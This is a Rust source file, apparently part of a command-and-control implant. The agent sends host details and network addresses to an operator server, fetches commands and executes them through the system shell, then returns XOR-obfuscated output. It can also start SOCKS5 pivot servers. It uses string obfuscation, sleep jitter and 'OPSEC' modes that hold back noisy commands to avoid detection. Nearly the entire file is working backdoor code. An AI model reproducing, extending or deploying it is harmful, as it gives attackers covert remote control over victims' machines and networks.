use crate::commands::obfuscated::{obfuscate_command, random_case, random_quote_insertion, random_char_insertion, xor_obfuscate};
use crate::config::AgentConfig;
use crate::networking::egress::get_egress_ip;
use crate::networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use crate::opsec::{OPSEC_STATE, AgentMode, determine_agent_mode};
use crate::util::random_jitter;
use get_if_addrs::get_if_addrs;
use hostname;
use log::{info, error, debug, warn};
use once_cell::sync::Lazy;
use os_info;
use reqwest::StatusCode;
use serde_json::json;
use std::collections::HashMap;
use std::env;
use std::io;
use std::path::Path;
use std::process::Command;
use std::sync::Arc;
use std::sync::Mutex;
use std::time::{Duration};
use tokio::sync::Mutex as TokioMutex;
use tokio::sync::mpsc;
use tokio::task::JoinHandle;
use tokio::time::timeout;
use obfstr::obfstr;
use serde::Deserialize;

static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));

// Define the expected structure for the command response JSON
#[derive(Deserialize)]
struct CommandResponse {
    command: String,
}

#[cfg(windows)]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new("cmd");
    cmd.arg("/C").arg(command);
    cmd.args(args);
    cmd
}


#[cfg(not(windows))]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new(command);
    cmd.args(args);
    cmd
}


fn get_all_local_ips() -> Vec<String> {
    let mut ips = Vec::new();
    if let Ok(ifaces) = get_if_addrs() {
        for iface in ifaces {
            match iface.addr {
                get_if_addrs::IfAddr::V4(v4) => {
                    if !v4.ip.is_loopback() {
                        ips.push(v4.ip.to_string());
                    }
                }
                get_if_addrs::IfAddr::V6(v6) => {
                    if !v6.ip.is_loopback() {
                        ips.push(v6.ip.to_string());
                    }
                }
            }
        }
    }
    ips
}



async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
    if cmd_parts.is_empty() {
        return Ok(String::new());
    }

    // Handle cd command specially
    if cmd_parts[0] == "cd" {
        if let Some(dir) = cmd_parts.get(1) {
            let path = Path::new(dir);
            if path.exists() {
                env::set_current_dir(path)?;
                return Ok(format!("Changed directory to {}", env::current_dir()?.display()));
            } else {
                return Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"));
            }
        }
        return Ok(format!("Current directory: {}", env::current_dir()?.display()));
    }

    // PATCH: Decrypt sensitive state before command execution
    {
        let mut protector = crate::state::MEMORY_PROTECTOR.lock().unwrap();
        protector.unprotect();
    }

    // Handle other commands with timeout
    let result = timeout(Duration::from_secs(30), async {
        let output = if cfg!(windows) {
            let full_command = cmd_parts.join(" ");
            create_command(&full_command, &[]).output()?
        } else {
            create_command(cmd_parts[0], &cmd_parts[1..]).output()?
        };

        Ok::<_, io::Error>(format!("{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)))
    }).await;

    // PATCH: Re-encrypt sensitive state immediately after command execution
    {
        let mut protector = crate::state::MEMORY_PROTECTOR.lock().unwrap();
        protector.protect();
    }

    match result {
        Ok(Ok(output)) => Ok(output),
        Ok(Err(e)) => Err(e),
        Err(_) => Err(io::Error::new(io::ErrorKind::TimedOut, "Command timed out after 30 seconds"))
    }
}

// Helper function to update C2 failure state
fn update_c2_failure_state(success: bool) {
    if let Ok(mut state_guard) = OPSEC_STATE.lock() {
        if success {
            if state_guard.consecutive_c2_failures > 0 {
                debug!("[OPSEC C2] C2 communication successful, resetting failure count from {}", state_guard.consecutive_c2_failures);
                state_guard.consecutive_c2_failures = 0;
            }
        } else {
            state_guard.consecutive_c2_failures = state_guard.consecutive_c2_failures.saturating_add(1);
            warn!("[OPSEC C2] C2 communication failed, consecutive failures: {}", state_guard.consecutive_c2_failures);
        }
    } else {
        error!("[OPSEC C2] Failed to lock OPSEC_STATE to update C2 failure count.");
    }
}

// Send heartbeat to the server
pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/heartbeat").to_string().replace("{}", agent_id));
    info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    let client_result = config.build_http_client();
    if client_result.is_err() { // Handle client build failure as a C2 failure
        update_c2_failure_state(false);
        return Err(client_result.err().unwrap());
    }
    let client = client_result.unwrap();
    
    let os = os_info::get();
    let hostname = hostname::get()?
        .to_string_lossy()
        .to_string();
    let ip_list = get_all_local_ips();
    let ip = if ip_list.is_empty() { "Unknown".into() } else { ip_list.join(",") };
    let egress_ip = get_egress_ip(server_addr);

    let data = json!({
        "id": agent_id,
        "os": os.os_type().to_string(),
        "hostname": hostname,
        "ip": ip,
        "ip_list": ip_list,
        "egress_ip": egress_ip,
        "commands": Vec::<String>::new()
    });

    match client.post(&url).json(&data).send().await {
        Ok(response) => {
            info!("[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
            if response.status().is_success() {
                update_c2_failure_state(true); // SUCCESS
                Ok(())
            } else {
                error!("[HTTP] Heartbeat failed with status: {}", response.status());
                update_c2_failure_state(false); // FAILURE
                Err(io::Error::new(io::ErrorKind::Other, 
                    format!("Heartbeat failed with status: {}", response.status())))
            }
        }
        Err(e) => {
            error!("[HTTP] Heartbeat POST failed: {}", e);
            update_c2_failure_state(false); // FAILURE
            Err(io::Error::new(io::ErrorKind::Other, e))
    }
    }
}

// Fetch command from the server
async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/command").to_string().replace("{}", agent_id));
    info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    let client_result = config.build_http_client();
    if client_result.is_err() {
        update_c2_failure_state(false);
        return Err(client_result.err().unwrap());
    }
    let client = client_result.unwrap();

    match client.get(&url).send().await {
        Ok(response) => {
    info!("[HTTP] Command GET response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
    if response.status() == StatusCode::NO_CONTENT {
                update_c2_failure_state(true); // SUCCESS (no command)
        return Ok(None);
    }
            if response.status().is_success() {
                // Attempt to parse JSON. If it fails, it's still a C2 communication failure *semantically*.
                match response.json::<CommandResponse>().await {
                    Ok(cmd_resp) => {
                        update_c2_failure_state(true); // SUCCESS (command received and parsed)
                        Ok(Some(cmd_resp.command))
                    }
                    Err(e) => {
                        error!("[HTTP] Failed to parse command response JSON: {}", e);
                        update_c2_failure_state(false); // FAILURE (bad response from C2)
                        Err(io::Error::new(io::ErrorKind::Other, e))
                    }
                }
            } else {
        error!("[HTTP] Command fetch failed with status: {}", response.status());
                update_c2_failure_state(false); // FAILURE (bad HTTP status)
                Err(io::Error::new(io::ErrorKind::Other, 
                    format!("Command fetch failed with status: {}", response.status())))
            }
        }
        Err(e) => {
            error!("[HTTP] Command GET failed (network error): {}", e);
            update_c2_failure_state(false); // FAILURE (network layer)
            Err(io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

// Submit result to the server
async fn submit_result_with_client(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    command: &str,
    output: &str
) -> io::Result<()> {
    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/result").to_string().replace("{}", agent_id));
    info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
    let client_result = config.build_http_client();
    if client_result.is_err() {
        update_c2_failure_state(false);
        return Err(client_result.err().unwrap());
    }
    let client = client_result.unwrap();
    let obfuscated_output = xor_obfuscate(output, agent_id);
    let data = json!({
        "command": command,
        "output": obfuscated_output
    });

    match client.post(&url).json(&data).send().await {
        Ok(response) => {
    info!("[HTTP] Result POST response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
            if response.status().is_success() {
                update_c2_failure_state(true); // SUCCESS
                Ok(())
            } else {
        error!("[HTTP] Result submission failed with status: {}", response.status());
                update_c2_failure_state(false); // FAILURE (bad HTTP status)
                Err(io::Error::new(io::ErrorKind::Other, 
                    format!("Result submission failed with status: {}", response.status())))
            }
        }
        Err(e) => {
            error!("[HTTP] Result POST failed (network error): {}", e);
            update_c2_failure_state(false); // FAILURE (network layer)
            Err(io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

fn is_weak_command(cmd: &str) -> bool {
    let quiet = [
        obfstr!("ping").to_string(),
        obfstr!("echo").to_string(),
    ];
    quiet.iter().any(|q| cmd.starts_with(q))
}

fn is_strong_command(cmd: &str) -> bool {
    let noisy = [
        obfstr!("screenshot").to_string(),
        obfstr!("scan").to_string(),
        obfstr!("upload").to_string(),
        obfstr!("download").to_string(),
        obfstr!("ls").to_string(),
        obfstr!("ps").to_string(),
        obfstr!("netstat").to_string(),
        obfstr!("ifconfig").to_string(),
        obfstr!("whoami").to_string(),
        obfstr!("uname").to_string(),
        obfstr!("cat").to_string(),
    ];
    noisy.iter().any(|n| cmd.starts_with(n))
}

// Check if the command should be executed based on the current opsec mode
// This function now only queues, execution logic is in agent_loop
fn should_queue_command(cmd: &str) -> bool {
    let mode;
    { // Scope for lock
        mode = OPSEC_STATE.lock().unwrap().mode;
    }
    debug!("[OPSEC] should_queue_command: mode={:?}, cmd={}", mode, cmd);
    match mode {
        AgentMode::FullOpsec | AgentMode::ReducedActivity => {
            // Always queue in these modes, even weak commands, 
            // as agent_loop shouldn't be running to execute them anyway.
            debug!("[OPSEC] {:?}: Queuing command: {}", mode, cmd);
                QUEUED_COMMANDS.lock().unwrap().push(cmd.to_string());
            true // Indicates command was queued
            }
        AgentMode::BackgroundOpsec => {
             debug!("[OPSEC] BackgroundOpsec: Not queuing command: {}", cmd);
            false // Do not queue in BackgroundOpsec
        }
    }
}

// Main function to run the shell
pub async fn agent_loop(
    server_addr: &str,
    agent_id: &str,
    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
) -> Result<(), Box<dyn std::error::Error>> {
    let config = AgentConfig::load()?;
    info!("[SHELL] Entering agent_loop (BackgroundOpsec Active)");
    // Initial heartbeat for this active period
    // Use a separate Result variable to avoid breaking loop on first heartbeat failure
    let initial_heartbeat_result = send_heartbeat_with_client(&config, server_addr, agent_id).await;
    if let Err(e) = initial_heartbeat_result {
        error!("[SHELL] Initial heartbeat failed: {}. Returning to main loop for OPSEC re-assessment.", e);
        // No need to break explicitly, loop condition will handle it if state changed due to failure
    }

    loop {
        // Determine current OPSEC mode *before* acting
        let current_mode = determine_agent_mode(&config);

        // If no longer in BackgroundOpsec, exit agent_loop immediately
        if current_mode != AgentMode::BackgroundOpsec {
            info!("[SHELL] OPSEC mode changed to {:?}. Exiting agent_loop.", current_mode);
            break Ok(()); // Exit loop, return control to main.rs
        }

        // Still in BackgroundOpsec, proceed with C2 communication
        let sleep_time = random_jitter(config.sleep_interval, config.jitter);
        info!("[SHELL] Polling for commands (Interval: {}s)", sleep_time);
        
        match get_command_with_client(&config, server_addr, agent_id).await {
            Ok(Some(command)) => {
                info!("[SHELL] Received command: {}", command);

                if command.starts_with("pivot_start ") {
                    if let Ok(port) = command["pivot_start ".len()..].trim().parse::<u16>() {
                        let msg = start_pivot_server(port, pivot_handler.clone(), pivot_tx.clone()).await
                            .unwrap_or_else(|e| e);
                        let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
                        continue;
                    }
                }
                if command.starts_with("pivot_stop ") {
                    if let Ok(port) = command["pivot_stop ".len()..].trim().parse::<u16>() {
                        let msg = stop_pivot_server(port).await.unwrap_or_else(|e| e);
                        let _ = submit_result_with_client(&config, server_addr, agent_id, &command, &msg).await;
                        continue;
                    }
                }

                // Queue check (moved earlier, simplified)
                if !should_queue_command(&command) {
                    // If not queued, proceed to execute in BackgroundOpsec
                    let mut obf_cmd = command.clone();
                    // obf_cmd = random_case(&obf_cmd, 0.5); // TEMP DISABLED
                    // obf_cmd = random_quote_insertion(&obf_cmd, 0.3); // TEMP DISABLED
                    // obf_cmd = random_char_insertion(&obf_cmd, 0.2); // TEMP DISABLED
                    // obf_cmd = obfuscate_command(&obf_cmd); // TEMP DISABLED

                    // debug!("[OPSEC] Executing obfuscated command: '{}', original: '{}'", obf_cmd, command); // Log both for clarity
                    // For now, log the command that will actually be used for parts:
                    debug!("[OPSEC] Preparing to execute command: '{}' (obfuscation disabled)", obf_cmd);

                    let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
                    // debug!("[OPSEC] Executing command: {}", command); // This was the old log, replaced by the one above

                    // --- NEW: Update OPSEC state if command is noisy ---
                    if is_strong_command(&command) { // Use original command for check
                        if let Ok(mut state_guard) = OPSEC_STATE.lock() {
                            state_guard.last_noisy_command_time = Some(std::time::Instant::now());
                            debug!("[OPSEC] Marked noisy command execution time: {}", command);
                        } else {
                            error!("[OPSEC] Failed to lock OPSEC_STATE to mark noisy command.");
                        }
                    }
                    // --- END NEW ---

                    match execute_command(&cmd_parts).await {
                        Ok(output) => {
                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
                                error!("[SHELL] Failed to submit result: {}", e);
                                // C2 failure counter updated in submit_result_with_client
                            } else {
                                info!("[SHELL] Result submitted successfully");
                            }
                        }
                        Err(e) => {
                            let error_msg = format!("Command failed: {}", e);
                            if let Err(e_submit) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
                                error!("[SHELL] Failed to submit error result: {}", e_submit);
                            }
                            error!("[SHELL] Command execution error: {}. Continuing...", e);
                        }
                    }
                } else {
                    // Command queued by should_queue_command
                    debug!("[SHELL] Command queued for later execution (in BackgroundOpsec): {}", command);
                    // NOTE: Queue is now processed here, right after checking
                }
            }
            Ok(None) => {
                debug!("[SHELL] No command received.");
                // No command is a successful C2 interaction, failure counter reset in get_command
            }
            Err(e) => {
                 error!("[SHELL] Failed to get command: {}. Sleeping...", e);
                 // C2 failure counter updated in get_command
            }
        }

        // --- Process Queued Commands --- 
        // Always check and process queue while in BackgroundOpsec
        let mut commands_to_run = Vec::new();
        {
            // Scope for QUEUED_COMMANDS lock
            let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
            commands_to_run.extend(queue_guard.drain(..));
        } // Lock released
        
        if !commands_to_run.is_empty() {
            info!("[SHELL] Processing {} queued commands...", commands_to_run.len());
            for cmd in commands_to_run {
                 // Re-check mode *before executing each queued command*
                 let mode_before_queued = determine_agent_mode(&config);
                 if mode_before_queued != AgentMode::BackgroundOpsec {
                    info!("[SHELL] OPSEC mode changed to {:?} while processing queue. Re-queuing remaining commands and exiting agent_loop.", mode_before_queued);
                    // Re-queue the command we didn't run + any others that were drained
                    // (Alternative: only re-queue current 'cmd' if needed)
                    let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
                    queue_guard.push(cmd); // Re-queue the current one
                    // queue_guard.extend(commands_to_run[index+1..].iter().cloned()); // If we tracked index
                    break; // Exit the processing loop
                 }

                debug!("[SHELL] Executing queued command: {}", cmd);
                let cmd_parts: Vec<&str> = cmd.split_whitespace().collect();
                
                // --- NEW: Update OPSEC state if queued command is noisy --- 
                if is_strong_command(&cmd) { // Use original command for check
                    if let Ok(mut state_guard) = OPSEC_STATE.lock() {
                        state_guard.last_noisy_command_time = Some(std::time::Instant::now());
                        debug!("[OPSEC] Marked noisy command execution time (queued): {}", cmd);
                    } else {
                        error!("[OPSEC] Failed to lock OPSEC_STATE to mark noisy queued command.");
                    }
                }
                // --- END NEW ---

                // Execute command (same logic as above)
                match execute_command(&cmd_parts).await {
                    Ok(output) => {
                    let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &output).await;
                }
                    Err(e) => {
                         let error_msg = format!("Queued command failed: {}", e);
                         let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &error_msg).await;
                         error!("[SHELL] Queued command execution error: {}", e);
                    }
                }
            }
            // If the inner loop broke due to mode change, the outer loop condition will catch it next iteration.
        }
        // --- End Process Queued Commands ---

        // Sleep before next poll
        debug!("[SHELL] Sleeping for {} seconds...", sleep_time);
        tokio::time::sleep(Duration::from_secs(sleep_time)).await;

        // Outer loop condition will re-evaluate OPSEC mode on next iteration
    }
}

// Start a pivot server on the specified port
// This function is called when the command "pivot_start <port>" is received
async fn start_pivot_server(
    port: u16,
    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
) -> Result<String, String> {
    let mut servers = PIVOT_SERVERS.lock().await;
    if servers.contains_key(&port) {
        return Err(format!("Pivot server already running on port {}", port));
    }
    let server = Socks5PivotServer::new("127.0.0.1".to_string(), port, pivot_tx);
    let handler = pivot_handler.clone();
    let handle = tokio::spawn(async move {
        server.run(handler).await;
    });
    servers.insert(port, handle);
    Ok(format!("Started pivot server on port {}", port))
}

// Stop a pivot server on the specified port
// This function is called when the command "pivot_stop <port>" is received
async fn stop_pivot_server(port: u16) -> Result<String, String> {
    let mut servers = PIVOT_SERVERS.lock().await;
    if let Some(handle) = servers.remove(&port) {
        handle.abort();
        Ok(format!("Stopped pivot server on port {}", port))
    } else {
        Err(format!("No pivot server running on port {}", port))
    }
}

